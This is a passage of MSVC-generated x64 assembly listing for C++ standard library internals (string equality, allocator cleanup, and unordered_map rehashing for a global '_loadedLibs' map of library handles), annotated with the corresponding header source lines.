; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??R?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@QEBA_NAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@0@Z
_TEXT	SEGMENT
this$dead$ = 48
_Left$ = 56
_Right$ = 64
??R?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@QEBA_NAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@0@Z PROC ; std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >::operator(), COMDAT

; 516  :         noexcept(noexcept(_STD _Fake_copy_init<bool>(_Left == _Right))) /* strengthened */ {

$LN34:
	sub	rsp, 40					; 00000028H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [r8+24], 15
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 516  :         noexcept(noexcept(_STD _Fake_copy_init<bool>(_Left == _Right))) /* strengthened */ {

	mov	r9, r8
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4633 :         return _Traits_equal<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize,

	mov	rcx, QWORD PTR [r8+16]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 516  :         noexcept(noexcept(_STD _Fake_copy_init<bool>(_Left == _Right))) /* strengthened */ {

	mov	rax, rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN11@operator

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	r9, QWORD PTR [r8]
$LN11@operator:

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rdx+24], 15

; 4633 :         return _Traits_equal<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize,

	mov	r8, QWORD PTR [rdx+16]

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN18@operator

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rax, QWORD PTR [rdx]
$LN18@operator:

; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	cmp	r8, rcx
	jne	SHORT $LN26@operator

; 379  :         return __builtin_memcmp(_First1, _First2, _Count);

	mov	rdx, r9
	mov	rcx, rax
	call	memcmp

; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	test	eax, eax
	jne	SHORT $LN26@operator
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 517  :         return _Left == _Right;

	mov	al, 1

; 518  :     }

	add	rsp, 40					; 00000028H
	ret	0
$LN26@operator:

; 517  :         return _Left == _Right;

	xor	al, al

; 518  :     }

	add	rsp, 40					; 00000028H
	ret	0
??R?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@QEBA_NAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@0@Z ENDP ; std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >::operator()
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??1?$_Alloc_construct_ptr@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1?$_Alloc_construct_ptr@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@XZ PROC ; std::_Alloc_construct_ptr<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::~_Alloc_construct_ptr<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >, COMDAT

; 1137 :         if (_Ptr) {

	mov	rcx, QWORD PTR [rcx+8]
	test	rcx, rcx
	je	SHORT $LN7@Alloc_cons

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	edx, 56					; 00000038H
	jmp	??3@YAXPEAX_K@Z				; operator delete
$LN7@Alloc_cons:

; 1138 :             _Al.deallocate(_Ptr, 1);
; 1139 :         }
; 1140 :     }

	ret	0
??1?$_Alloc_construct_ptr@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@XZ ENDP ; std::_Alloc_construct_ptr<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::~_Alloc_construct_ptr<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xbit_ops.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xbit_ops.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xbit_ops.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xbit_ops.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xbit_ops.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ?_Forced_rehash@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAAX_K@Z
_TEXT	SEGMENT
_Bucket_lo$1$ = 32
this$dead$ = 96
_Buckets$ = 104
?_Forced_rehash@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAAX_K@Z PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Forced_rehash, COMDAT

; 1705 :     void _Forced_rehash(size_type _Buckets) {

$LN292:
	push	rbx
	sub	rsp, 80					; 00000050H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xbit_ops.h

; 40   :     _BitScanReverse64(&_Result, _Value); // lgtm [cpp/conditionallyuninitializedvariable]

	mov	rax, 1152921504606846975		; 0fffffffffffffffH
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1713 :         const auto _Max_storage_buckets               = static_cast<size_type>(1) << _Max_storage_buckets_log2;

	mov	ebx, 1
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xbit_ops.h

; 40   :     _BitScanReverse64(&_Result, _Value); // lgtm [cpp/conditionallyuninitializedvariable]

	bsr	rcx, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1713 :         const auto _Max_storage_buckets               = static_cast<size_type>(1) << _Max_storage_buckets_log2;

	mov	eax, ebx
	shl	rax, cl

; 1714 :         if (_Buckets > _Max_storage_buckets) {

	cmp	rdx, rax
	ja	$LN290@Forced_reh
	mov	QWORD PTR [rsp+96], rbp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xbit_ops.h

; 51   :     return 1 + _Floor_of_log_2(_Value - 1);

	lea	rax, QWORD PTR [rdx-1]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 37   :     _List_unchecked_const_iterator(_Nodeptr _Pnode, const _Mylist* _Plist) noexcept : _Ptr(_Pnode) {

	mov	rbp, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xbit_ops.h

; 25   :     _Value |= size_t{1}; // avoid undefined answer from _BitScanReverse for 0

	or	rax, rbx

; 40   :     _BitScanReverse64(&_Result, _Value); // lgtm [cpp/conditionallyuninitializedvariable]

	bsr	rcx, rax
	mov	QWORD PTR [rsp+112], rsi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1725 :         _Vec._Assign_grow(_Buckets << 1, _End);

	mov	r8, rbp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xbit_ops.h

; 51   :     return 1 + _Floor_of_log_2(_Value - 1);

	inc	ecx
	mov	QWORD PTR [rsp+120], rdi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1722 :         _Buckets                       = static_cast<size_type>(1) << _Ceiling_of_log_2(static_cast<size_t>(_Buckets));

	shl	rbx, cl

; 1725 :         _Vec._Assign_grow(_Buckets << 1, _End);

	lea	rcx, OFFSET FLAT:?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+24
	mov	QWORD PTR [rsp+48], r15
	lea	rdx, QWORD PTR [rbx+rbx]
	call	?_Assign_grow@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAAX_KV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@@Z ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::_Assign_grow
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 37   :     _List_unchecked_const_iterator(_Nodeptr _Pnode, const _Mylist* _Plist) noexcept : _Ptr(_Pnode) {

	mov	rdi, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1726 :         _Mask   = _Buckets - 1;

	lea	r15, QWORD PTR [rbx-1]
	mov	QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+48, r15

; 1727 :         _Maxidx = _Buckets;

	mov	QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+56, rbx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 37   :     _List_unchecked_const_iterator(_Nodeptr _Pnode, const _Mylist* _Plist) noexcept : _Ptr(_Pnode) {

	mov	rdi, QWORD PTR [rdi]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1734 :         for (_Unchecked_iterator _Next_inserted = _Inserted; _Inserted != _End; _Inserted = _Next_inserted) {

	mov	rsi, rdi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 72   :         return _Ptr == _Right._Ptr;

	cmp	rdi, rbp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1734 :         for (_Unchecked_iterator _Next_inserted = _Inserted; _Inserted != _End; _Inserted = _Next_inserted) {

	je	$LN282@Forced_reh
	mov	QWORD PTR [rsp+72], r12
	mov	rbx, 1099511628211			; 00000100000001b3H
	mov	QWORD PTR [rsp+64], r13
	mov	QWORD PTR [rsp+56], r14
$LN288@Forced_reh:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	r12, QWORD PTR [rdi+40]

; 2235 :         const value_type* _Result = _Bx._Buf;

	lea	r9, QWORD PTR [rdi+16]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 50   :         _Ptr = _Ptr->_Next;

	mov	rsi, QWORD PTR [rsi]
	mov	rax, -3750763034362895579		; cbf29ce484222325H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	mov	r8, QWORD PTR [rdi+32]

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	r12, 15

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN256@Forced_reh

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	r9, QWORD PTR [rdi+16]
$LN256@Forced_reh:

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	xor	edx, edx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2333 :     return _Fnv1a_append_bytes(

	mov	rcx, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	mov	r10, r8
	mov	r11, r12
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	test	r8, r8
	je	SHORT $LN101@Forced_reh
	npad	7
$LL241@Forced_reh:

; 2301 :         _Val ^= static_cast<size_t>(_First[_Idx]);

	movzx	eax, BYTE PTR [r9+rdx]
	inc	rdx
	xor	rcx, rax

; 2302 :         _Val *= _FNV_prime;

	imul	rcx, rbx
	cmp	rdx, r8
	jb	SHORT $LL241@Forced_reh
$LN101@Forced_reh:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1742 :             _Unchecked_iterator& _Bucket_lo = _Vec._Mypair._Myval2._Myfirst[_Bucket << 1];

	mov	rax, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+24

; 852  :         return _Traitsobj(_Keyval) & _Mask;

	and	rcx, r15

; 1742 :             _Unchecked_iterator& _Bucket_lo = _Vec._Mypair._Myval2._Myfirst[_Bucket << 1];

	shl	rcx, 4
	add	rax, rcx
	mov	QWORD PTR _Bucket_lo$1$[rsp], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 72   :         return _Ptr == _Right._Ptr;

	mov	r13, QWORD PTR [rax]
	cmp	r13, rbp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1745 :             if (_Bucket_lo == _End) {

	jne	SHORT $LN9@Forced_reh

; 1746 :                 // The bucket was empty, set it to the inserted element.
; 1747 :                 _Bucket_lo = _Inserted;

	mov	QWORD PTR [rax], rdi

; 1748 :                 _Bucket_hi = _Inserted;

	mov	QWORD PTR [rax+8], rdi

; 1749 :                 continue;

	jmp	$LN2@Forced_reh
$LN9@Forced_reh:

; 1750 :             }
; 1751 : 
; 1752 :             // Search the bucket for the insertion location and move element if necessary.
; 1753 :             _Unchecked_const_iterator _Insert_before = _Bucket_hi;

	mov	rbx, QWORD PTR [rax+8]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rbx+40], 15
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 42   :         return _Ptr->_Myval;

	lea	rdx, QWORD PTR [rbx+16]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4633 :         return _Traits_equal<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize,

	mov	rax, QWORD PTR [rdx+16]

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN160@Forced_reh

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rdx, QWORD PTR [rdx]
$LN160@Forced_reh:

; 2235 :         const value_type* _Result = _Bx._Buf;

	lea	rcx, QWORD PTR [rdi+16]

; 2244 :         return _Myres > _Small_string_capacity;

	mov	r15, r8
	cmp	r12, 15

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN255@Forced_reh

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rcx, QWORD PTR [rdi+16]
	mov	r15, r10
	mov	r12, r11
$LN255@Forced_reh:

; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	cmp	r8, rax
	jne	SHORT $LN10@Forced_reh

; 379  :         return __builtin_memcmp(_First1, _First2, _Count);

	call	memcmp

; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	test	eax, eax
	jne	SHORT $LN10@Forced_reh
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 50   :         _Ptr = _Ptr->_Next;

	mov	r8, QWORD PTR [rbx]
	cmp	r8, rdi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1758 :                 if (_Insert_before != _Inserted) { // avoid splice on element already in position

	je	SHORT $LN232@Forced_reh
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 474  :         const auto _First_prev  = _First->_Prev;

	mov	rdx, QWORD PTR [rdi+8]

; 475  :         _First_prev->_Next      = _Last;

	mov	QWORD PTR [rdx], rsi

; 476  :         const auto _Last_prev   = _Last->_Prev;

	mov	rcx, QWORD PTR [rsi+8]

; 477  :         _Last_prev->_Next       = _Before;

	mov	QWORD PTR [rcx], r8

; 478  :         const auto _Before_prev = _Before->_Prev;

	mov	rax, QWORD PTR [r8+8]

; 479  :         _Before_prev->_Next     = _First;

	mov	QWORD PTR [rax], rdi

; 480  : 
; 481  :         // fixup the _Prev values
; 482  :         _Before->_Prev = _Last_prev;

	mov	QWORD PTR [r8+8], rcx

; 483  :         _Last->_Prev   = _First_prev;

	mov	QWORD PTR [rsi+8], rdx

; 484  :         _First->_Prev  = _Before_prev;

	mov	QWORD PTR [rdi+8], rax
$LN232@Forced_reh:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1762 :                 _Bucket_hi = _Inserted;

	mov	rax, QWORD PTR _Bucket_lo$1$[rsp]
	mov	QWORD PTR [rax+8], rdi

; 1763 :                 continue;

	jmp	SHORT $LN287@Forced_reh
$LN10@Forced_reh:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 72   :         return _Ptr == _Right._Ptr;

	cmp	r13, rbx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1769 :                 if (_Bucket_lo == _Insert_before) {

	je	SHORT $LN238@Forced_reh
$LL5@Forced_reh:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 61   :         _Ptr = _Ptr->_Prev;

	mov	rbx, QWORD PTR [rbx+8]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rbx+40], 15
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 42   :         return _Ptr->_Myval;

	lea	rdx, QWORD PTR [rbx+16]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4633 :         return _Traits_equal<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize,

	mov	rax, QWORD PTR [rdx+16]

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN41@Forced_reh

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rdx, QWORD PTR [rdx]
$LN41@Forced_reh:

; 2235 :         const value_type* _Result = _Bx._Buf;

	lea	rcx, QWORD PTR [rdi+16]

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	r12, 15

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN48@Forced_reh

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rcx, QWORD PTR [rdi+16]
$LN48@Forced_reh:

; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	cmp	r15, rax
